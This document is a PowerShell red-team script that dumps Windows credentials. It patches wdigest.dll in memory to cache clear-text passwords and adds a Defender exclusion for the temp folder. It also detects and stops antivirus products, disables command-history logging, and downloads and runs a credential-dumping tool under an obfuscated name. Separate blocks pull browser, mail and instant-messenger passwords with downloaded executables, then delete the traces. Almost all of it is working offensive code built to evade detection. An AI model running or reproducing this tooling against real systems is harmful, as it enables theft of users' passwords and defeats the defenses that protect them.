<#
.SYNOPSIS
   WDigest credential caching [Memory]

   Author: @r00t-3xp10it
   Credits: @wh0nsq [BypassCredGuard.exe]
   Credits: @BenjaminDelpy [mi`mi`katz.exe]
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: Administrator privileges
   Optional Dependencies: WDigest, BypassCredGuard.exe
   PS cmdlet Dev version: v3.5.18
   
.DESCRIPTION
   WDigest stores clear-text passwords in memory. An adversary can use a tool like
   M[i]mika[t]z to get not just the hashes stored in memory, but the clear-text creds
   as well. As a result, they will not be limited to attacks like Pass-the-Hash, they
   also be able to log on to Exchange, internal web sites, and other resources that
   require entering a user ID and password.

.NOTES
   This module allow users to dump WDigest creds with M[i]mika[t]z without reboot or to
   spawn\execute M[i]mika[t]z trougth Windows defender ExclusionPath to bypass detection.

   To use M[i]mika[t]z interactive shell invoke -manycats switch together with -module 'false' paramter
   To use M[i]mika[t]z multiple::modules invoke -manycats with -module 'sekurlsa::wdigest event::clear'
   REMARK: This cmdlet only bypasses M[i]mika[t]z detection if Windows Defender its the only AV running.

   -runas and -dcname are demonstration parameter switch's that promps user for credential
   input so that WDigest can store it in memory and M[i]mika[t]z can dump it later [demo]. 

.Parameter WDigest
   Activate WDigest credential caching in Memory? (default: true)

.Parameter Manycats
   Switch that downloads\executes M[i]mika[t]z to dump credentials

.Parameter BrowserCreds
   Switch that dumps installed browers credentials in clear-text

.Parameter RunAs
   Switch that promps user for credential input and store it in memory

.Parameter DcName
   Switch of RunAs command that accepts USER@DOMAIN or DOMAIN\USER form
   Remark: this function requires -RunAs parameter switch declaration

.Parameter Module
   M[i]mika[t]z selection of modules to run (default: sekurlsa::wdigest)

.EXAMPLE
   PS C:\> .\Invoke-WDigest.ps1 -wdigest 'false' -manycats
   Execute M[i]mika[t]z (interactive shell) without WDigest caching

.EXAMPLE
   PS C:\> .\Invoke-WDigest.ps1 -wdigest 'true' -manycats
   Ativate WDigest caching + Execute M[i]mika[t]z sekurlsa::wdigest

.EXAMPLE
   PS C:\> .\Invoke-WDigest.ps1 -wdigest 'true' -manycats -module 'auto'
   Ativate WDigest caching + Exec M[i]mika[t]z pre-sellection of modules

.EXAMPLE
   PS C:\> .\Invoke-WDigest.ps1 -wdigest 'false' -browsercreds
   Dump browser creds (nirsoft) without invoking WDigest caching

.EXAMPLE
   PS C:\> .\Invoke-WDigest.ps1 -wdigest 'true' -manycats -module 'net::group sekurlsa::wdigest exit'
   Ativate WDigest caching + Exec M[i]mika[t]z 'net::group sekurlsa::wdigest exit' multiple modules

.EXAMPLE
   PS C:\> .\Invoke-WDigest.ps1 -wdigest 'true' -manycats -runas
   [demo] This command allow us to invoke RunAs api [manual enter credential]
   and then use M[i]mika[t]z to dump WDigest recent stored credential [memory]

.INPUTS
   None. You cannot pipe objects into Invoke-WDigest.ps1

.OUTPUTS
   WDigest credential caching (Memory)
     - Privileges token: Administrator
     - DcUserName SKYNET\Administrator
     - Create defender %TMP% exclusion
     - Patching Wdigest.dll in Memory

   [*] Base address of wdigest.dll: 0x00007ffd4a670000
   [*] Matched signature at 0x00007ffd4a671c4b: 41 b5 01 85 c0
   [*] Address of g_fParameter_UseLogonCredential: 0x00007ffd4a6aa2e4
   [*] Address of g_IsCredGuardEnabled: 0x00007ffd4a6a9ca8
   [*] The current value of g_fParameter_UseLogonCredential is 0
   [*] Patched value of g_fParameter_UseLogonCredential to 1
   [*] The current value of g_IsCredGuardEnabled is 0
   [*] Patched value of g_IsCredGuardEnabled to 0

     - Downloading mi`mikat`z from github to %TMP%
     - Invoking mi`mikat`z sekurlsa::wdigest to dump creds.

    .#####.   mimi`kat`z 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
   .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
   ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
   ## \ / ##       > http://blog.gentilkiwi.com/mimi`kat`z
   '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
    '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

.LINK
   https://tools.thehacker.recipes/mimikatz/modules
   https://blog.xpnsec.com/exploring-mimikatz-part-1
   https://github.com/wh0nsq/BypassCredGuard/releases
   https://teamhydra.blog/2020/08/25/bypassing-credential-guard
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$DcName="${Env:COMPUTERNAME}\${Env:USERNAME}",
   [string]$WDigest="true",
   [string]$Module="false",
   [string]$Banner="true",
   [switch]$BrowserCreds,
   [switch]$ManyCats,
   [switch]$DebugMe,
   [switch]$RunAs
)


$StartBanner = @"

'##:::::'##:'########::'####::'######:::'########::'######::'########:
 ##:'##: ##: ##.... ##:. ##::'##... ##:: ##.....::'##... ##:... ##..::
 ##: ##: ##: ##:::: ##:: ##:: ##:::..::: ##::::::: ##:::..::::: ##::::
 ##: ##: ##: ##:::: ##:: ##:: ##::'####: ######:::. ######::::: ##::::
 ##: ##: ##: ##:::: ##:: ##:: ##::: ##:: ##...:::::..... ##:::: ##::::
 ##: ##: ##: ##:::: ##:: ##:: ##::: ##:: ##:::::::'##::: ##:::: ##::::
. ###. ###:: ########::'####:. ######::: ########:. ######::::: ##::::
:...::...:::........:::....:::......::::........:::......::::::..:::::
"@;
If($Banner -iMatch "^(true)$")
{
   write-host $StartBanner -ForegroundColor DarkRed
   Start-Sleep -Milliseconds 500
}

$CmdletVersion = "v3.5.18"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
If(-not($DebugMe.IsPresent)){$ErrorActionPreference = "SilentlyContinue"}
write-host "`nWDigest credential caching (Memory)" -ForegroundColor Green
$host.UI.RawUI.WindowTitle = "@DeviceGuard $CmdletVersion {SSA@RedTeam}"

## Make sure shell is running with administrator privileges
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
If($IsClientAdmin -iNotMatch '^(True)$')
{
   write-host "  - " -ForegroundColor Red -NoNewline
   write-host "Error: " -ForegroundColor DarkGray -NoNewline
   write-host "Administrator privileges required ..`n" -ForegroundColor Red
   return
}

$EDRvendors = @(
   "superantispyware",
   "MalwareBytes",
   "Bitdefender",
   "Trend Micro",
   "Kaspersky",
   "Symantec",
   "f-secure",
   "FireEye",
   "WebRoot",
   "Comodo",
   "F-Prot",
   "McAfee",
   "Sophos",
   "Norton",
   "Panda",
   "Nod32",
   "Avast",
   "GData",
   "Avira",
   "ESET",
   "AVG"
)


$Ipath = (Get-Location).Path
## Print OnScreen module information
write-host "  - " -ForegroundColor Red -NoNewline
write-host "Privileges token: " -NoNewline
write-host "Administrator" -ForegroundColor Red
Start-Sleep -Milliseconds 700
write-host "  - " -ForegroundColor Yellow -NoNewline
write-host "DcUserName $DcName"


cd "$Env:TMP"
## Create TMP% directory exclusion in windows Defender
If((Get-MpComputerStatus).RealTimeProtectionEnabled -Match '^(True)$')
{
   ## Make sure the exclusion does NOT already exist
   If((Get-MpPreference).ExclusionPath -NotMatch '(\\Temp)$')
   {
      write-host "  - " -ForegroundColor Yellow -NoNewline
      write-host "Create defender %TMP% exclusion"
      iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "$Env:TMP\Invoke-Exclusions.ps1";
      Start-Process -WindowStyle Hidden powershell -ArgumentList "-file Invoke-Exclusions.ps1 -Action add -Type ExclusionPath -Exclude $Env:TMP" -Wait
   }
}


If($Wdigest -Match '^(true)$')
{
   write-host "  - " -ForegroundColor Yellow -NoNewline
   write-host "Patching Wdigest.dll in Memory`n"
   ## Download (from my github) and Execute the binary.exe
   iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/BypassCredGuard.exe" -OutFile "BypassCredGuard.exe"|Unblock-File

   Try{
      .\BypassCredGuard.exe
   }Catch{write-host $_.Exception.Message -ForegroundColor Red;return}

   write-host ""
   Remove-Item -Path "$Env:TMP\BypassCredGuard.exe" -Force
}


If($ManyCats.IsPresent)
{
   ## Manual Login?
   If($RunAs.IsPresent)
   {
      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - Execute RunAs Command!

      .NOTES
         This module allows users to pause this cmdlet execution until one
         credential its inputed, then starts cmd.exe with suplied credential
         in a minimized windows (detach from parent). Child process its necessary
         for m[i]mika[t]z 'sekur[l]sa::w[d]igest' to dump credential from memory.
      #>

      If([string]::IsNullOrEmpty($DcName))
      {
         ## Use 'default' DC name in case var its empty
         $DcName = "${Env:COMPUTERNAME}\${Env:USERNAME}"
      }

      If($Wdigest -Match '^(true)$')
      {
         write-host "    [" -ForegroundColor Red -NoNewline
         write-host "Input" -NoNewline   
         write-host "] credential of username: $DcName" -ForegroundColor Red

         ## Prompt user for credential
         Start-Process -WindowStyle hidden cmd.exe -Credential ''
         If($? -Match '^(False)$')
         {
            write-host "  - fail to execute cmd.exe process." -ForegroundColor Red
         }
      }
      Else
      {
         $Obfuscation = "mi`mi" + "kat`z" -join ''
         write-host "`n    [" -ForegroundColor Red -NoNewline
         write-host "Error" -NoNewline
         write-host "] -runas switch requires param -wdigest 'true'" -ForegroundColor Red
         write-host "    Because child process started (runas) hangs $Obfuscation" -ForegroundColor DarkYellow
         write-host "    execution if $Obfuscation its executed in interactive mode." -ForegroundColor DarkYellow
      }
   }

   $Testme = @()
   $Obfuscation = "mi`mi" + "kat`z" -join ''
   ## Enumerate all Anti-Virus Processes running
   dir "$Env:TMP"|Where-Object{$_.Name -Match '(_CounterMeasures.log)$'}|Remove-Item -Force
   iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetCounterMeasures.ps1" -OutFile "$Env:TMP\GetCounterMeasures.ps1"|Unblock-File
   Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $Env:TMP\GetCounterMeasures.ps1 -logfile true" -Wait
   $AVNAME = (Gci -Path "$Env:TMP"|Where-Object{$_ -Match '_CounterMeasures.log'}).FullName

   write-host ""
   ForEach($Item in $EDRvendors)
   {
      $Testme += Get-Content -path "$AVNAME"|Select-String -pattern "$Item"

      If($Testme -iMatch "$Item")
      {
         write-host "    [" -ForegroundColor Red -NoNewline
         write-host "warning" -NoNewline
         write-host "] ${Item}: Disable proactive defense to run $Obfuscation.`n" -ForegroundColor Red
         Start-Sleep -Milliseconds 700

         If($Testme -Match 'kaspersky')
         {
            ## Automatic stop kaspersky service if AllowServiceStop -eq 1
            If((Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\KasperskyLab\protected\KES\settings").AllowServiceStop -eq 1)
            {
               $KESPath = $null
               ## Get kaspersky klpsm.exe directory name
               $KESPath = (gci -Path "$Env:PROGRAMFILES (x86)\Kaspersky Lab" -Recurse -Force|Select *|?{$_.Name -Match 'klpsm.exe'}).DirectoryName

               If(-not([string]::IsNullOrEmpty($KESPath)))
               {
                  cd "$KESPath"
                  .\klpsm.exe stop_avp_service|Out-Null
                  cd "$Env:TMP"
               }
            }
         } 
      }
   }

   ## CleanUP
   Remove-Item -Path "$AVNAME" -Force
   Remove-Item -Path "$Env:TMP\GetCounterMeasures.ps1" -Force

   ## Determining if system is 32 or 64 bit
   If($Env:PROCESSOR_ARCHITECTURE -eq "x86")
   {
      $GitHubParrotUri = "https://raw.githubusercontent.com/ParrotSec/${Obfuscation}/master/Win32/${Obfuscation}.exe"
   }
   Else
   {
      $GitHubParrotUri = "https://raw.githubusercontent.com/ParrotSec/${Obfuscation}/master/x64/${Obfuscation}.exe"
   }


   ## Download binary.exe from ParrotSec GitHub
   write-host "  - " -ForegroundColor Yellow -NoNewline
   write-host "Downloading ${Obfuscation}.exe from github to %TMP%"
   iwr -uri "$GitHubParrotUri" -OutFile "${Env:TMP}\manycats.msc"|Unblock-File

   ## m[i]mika[t]z execution
   write-host "  - " -ForegroundColor Yellow -NoNewline
   write-host "Invoking " -NoNewline
   write-host "${Obfuscation}" -ForegroundColor DarkYellow -NoNewline   


   If($Wdigest -Match '^(true)$')
   {
      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - M[i]mika[t]z - With WDigest catching

      .Parameter module
         Accepts values 'false', 'auto' Or
         m[i]mika[t]z multiple 'dump::modules'
      #>

      If($Module -Match '^(false)$')
      {
         $Sting = "sek%url@sa:@:lo@go%npa@ss%wo@rds"
         $AutomaticExecution = $Sting -replace '%','' -replace '@',''
         write-host " $AutomaticExecution `n" -ForegroundColor DarkYellow
         &('xEx' -replace '^(x)','i') ".\manycats.msc $AutomaticExecution exit" 
      }
      ElseIf($Module -iMatch '^(auto)$')
      {
         ## Running pre-sellection of modules 
         $Sting = "ne%t:@:gro@up t@s:%:ses@sio%ns dp@ap%i:%:ca@ch%e vau%lt:@:cr%ed sek%url@sa:@:wd@ig%est ex@it"            
         $AutomaticExecution = $Sting -replace '%','' -replace '@',''

         write-host " pre-selected modules [auto]`n"
         &('xEx' -replace '^(x)','i') ".\manycats.msc $AutomaticExecution"      
      }
      Else
      {
         write-host " multiple modules.`n"
         &('xEx' -replace '^(x)','i') ".\manycats.msc $Module"      
      }   
   }
   Else
   {
      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - M[i]mika[t]z - Without WDigest catching

      .Parameter module
         Accepts values 'false' (interactive shell),
         'auto' Or m[i]mika[t]z multiple 'dump::modules'
      #>

      If($Module -Match '^(false)$')
      {
         write-host " interactive shell`n"
         &('xEx' -replace '^(x)','i') ".\manycats.msc"
      }
      ElseIf($Module -iMatch '^(auto)$')
      {
         ## Running pre-sellection of modules 
         $Sting = "ne%t:@:gro@up t@s:%:ses@sio%ns dp@ap%i:%:ca@ch%e vau%lt:@:cr%ed sek%url@sa:@:wd@ig%est ex@it"            
         $AutomaticExecution = $Sting -replace '%','' -replace '@',''

         write-host " pre-selected modules [auto]`n"
         &('xEx' -replace '^(x)','i') ".\manycats.msc $AutomaticExecution"      
      }
      Else
      {
         write-host " multiple modules.`n"
         &('xEx' -replace '^(x)','i') ".\manycats.msc $Module"      
      }
   }

   write-host ""
   ## Auto-CleanUp of artifacts left behind
   Remove-Item -Path "${Env:TMP}\manycats.msc" -Force
}


If($BrowserCreds.IsPresent)
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Dump browser\outlook credentials
   #>

   ## Download binary.exe from redpill\utils [GitHub]
   write-host "`n  - " -ForegroundColor Yellow -NoNewline
   write-host "Downloading WebBrowserPass to %TMP%"

   ## WebBrowserPassView execution
   write-host "  - " -ForegroundColor Yellow -NoNewline
   write-host "Invoking " -NoNewline
   write-host "WebBrowser" -ForegroundColor DarkYellow -NoNewline
   write-host " Credential dump`n"

   ## Dump all browsers credentials
   $CmdLine = "/LoadPasswordsIE 1 /LoadPasswordsFirefox 1 /LoadPasswordsChrome 1 /LoadPasswordsOpera 1 /LoadPasswordsSafari 1"
   iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/WebBrowserPassView.exe" -OutFile "$Env:TMP\NavigatorView.msc"|Unblock-File
   Start-Process -WindowStyle Hidden powershell -ArgumentList ".\NavigatorView.msc $CmdLine /stext webbrowser.txt" -Wait
   Get-Content -Path "$Env:TMP\webbrowser.txt"

   ## Dump mail services credentials
   iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/mailpv.exe" -OutFile "$Env:TMP\mailpv.msc"|Unblock-File
   Start-Process -WindowStyle Hidden powershell -ArgumentList ".\mailpv.msc /stext maildump.txt" -Wait
   Get-Content -Path "$Env:TMP\maildump.txt"

   ## Dump Instant Messenger credentials
   iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/mspass.exe" -OutFile "$Env:TMP\mspass.msc"|Unblock-File
   Start-Process -WindowStyle Hidden powershell -ArgumentList ".\mspass.msc /stext mspass.txt" -Wait
   Get-Content -Path "$Env:TMP\mspass.txt"

   ## CleanUp
   Start-Sleep -Milliseconds 600
   Remove-Item -Path "${Env:TMP}\mspass.cfg" -Force
   Remove-Item -Path "${Env:TMP}\mspass.txt" -Force
   Remove-Item -Path "${Env:TMP}\mspass.msc" -Force
   Remove-Item -Path "${Env:TMP}\mailpv.cfg" -Force
   Remove-Item -Path "${Env:TMP}\mailpv.msc" -Force
   Remove-Item -Path "${Env:TMP}\maildump.txt" -Force
   Remove-Item -Path "${Env:TMP}\webbrowser.txt" -Force
   Remove-Item -Path "${Env:TMP}\NavigatorView.msc" -Force
   Remove-Item -Path "${Env:TMP}\WebBrowserPassView.cfg" -Force
}


## Windows Defender Exclusion CleanUp
If((Get-MpComputerStatus).RealTimeProtectionEnabled -Match '^(True)$')
{
   ## Make sure the exclusion exists
   If((Get-MpPreference).ExclusionPath -Match '(\\Temp)$')
   {
      write-host "`n  - " -ForegroundColor Red -NoNewline
      write-host "Removing '" -NoNewline
      write-host "%TMP%" -ForegroundColor Red -NoNewline
      write-host "' exclusion from windows defender."

      Start-Process -WindowStyle Hidden powershell -ArgumentList "-file Invoke-Exclusions.ps1 -Action del -Type ExclusionPath -Exclude $Env:TMP" -Wait;
      Remove-Item -Path "$Env:TMP\Invoke-Exclusions.ps1" -Force
   }
}

cd "$Ipath"
If($RunAs.IsPresent)
{
   ## Stop runas background process
   Stop-Process -Name "cmd" -Force
}

write-host "  - " -ForegroundColor Green -NoNewline
write-host "Module finished at: " -NoNewline
write-host "$(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Green -NoNewline
write-host " UTC`n"